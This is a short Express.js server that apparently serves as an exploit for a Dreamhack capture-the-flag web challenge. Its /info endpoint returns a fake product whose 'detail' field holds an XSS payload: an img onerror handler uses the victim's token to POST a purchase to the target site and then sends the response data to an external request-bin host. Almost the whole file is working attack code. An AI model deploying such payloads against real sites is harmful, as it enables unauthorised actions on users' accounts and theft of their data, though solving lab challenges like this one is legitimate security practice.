const express = require('express');
const app = express();
const cors = require('cors');

app.use(cors());

const PORT = 4000;
const url = "http://host3.dreamhack.games:13018";
const rqb = "https://tccbwmp.request.dreamhack.games";

app.use(express.json());

app.use((req, res, next) => {
    console.log(`${req.method} 요청을 받았습니다. 경로: ${req.originalUrl}`);

    const originalSend = res.send;
    res.send = function (body) {
        console.log('응답 내용:', body);
        res._sent = true;
        return originalSend.call(this, body);
    };

    res.on('finish', () => {
        if (!res._sent) {
            console.log('응답이 전송되지 않았습니다.');
        }
    });

    next();
});

app.get('/info', (req, res) => {
    const token = req.headers['token'];

    const items = {
        "id": 5,
        "name": "Exploit",
        "price": 9,
        "detail": `${`<div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => {fetch("${rqb}/"+data.data)})'/>${`</div>`.repeat(512)}`,
        "poster": ""
    };

    if (items) {
        res.send(items);
    } else {
        res.status(403).send('');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
